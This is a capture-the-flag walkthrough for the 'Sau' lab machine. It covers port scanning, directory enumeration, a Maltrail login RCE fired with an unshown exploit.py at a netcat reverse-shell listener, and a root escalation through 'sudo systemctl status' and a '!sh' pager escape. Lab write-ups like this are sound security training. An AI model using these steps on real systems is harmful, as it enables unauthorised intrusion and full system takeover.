# Sau

######  Easy- x1foideo


## Initial Recon 

#### Hosts

```bash
sudo nano /etc/hosts
```
```
<IP> <Host Name>
```


#### Nmap

```bash
sudo nmap -sS -sV -p- <IP> -o sau_htb
```
```
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp    filtered http
55555/tcp open     unknown
```


#### Web Enumeration

```bash
gobuster dir -e -u http://sau.htb:55555/ -w /usr/share/seclists/Discovery/Web-Content/big.txt -b 400,401,402,403,404 -t 100
```
```
http://sau.htb:55555/ace                  (Status: 200) [Size: 7091]
http://sau.htb:55555/password             (Status: 200) [Size: 0]
http://sau.htb:55555/test                 (Status: 200) [Size: 0]
http://sau.htb:55555/web                  (Status: 200) [Size: 8700]
```


## Solution

#### Gathering Info

Surfing the internet we notice there are two possible Vulnerabilities for this machine.

1) Request-Basket Vuln (CVE-2023-27163) --> **SSRF**
   *http://sau.htb:55555*
2) Maltrail Vuln --> **RCE**
   *http://sau.htb:55555/ace*
   

What we are going to use is the *Maltrail Vuln*.

> The vulnerability exists in the login page and can be exploited via the `username` parameter


**Local Host**

In a terminal Window run

```bash
nc -nlvp 9999
```

In a terminal Window run the exploit

```bash
python3 exploit.py <Local IP> <PORT> http://sau.htb:55555/ace/login
```


#### User Flag

After getting the RCE, move to /home/puma

Get *User Flag*


#### Root Flag

First of all let's check if we can run some commands as sudo

```bash
sudo -l
```
```
Matching Defaults entries for puma on sau:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```

As showed we are able to run as sudo

```bash
sudo /usr/bin/systemctl status trail.service
```

Checking on *GTFOBins* we get that

> This invokes the default pager, which is likely to be [`less`](https://gtfobins.github.io/gtfobins/less/), other functions may apply.
> 
> !sh

So after running this command we are able to move to /root

Get *Root Flag*


#nmap #enumeration #gobuster #blackliststatuscode #sudo #gtfobins #reverseshell #maltrail #requestbasket #systemctl
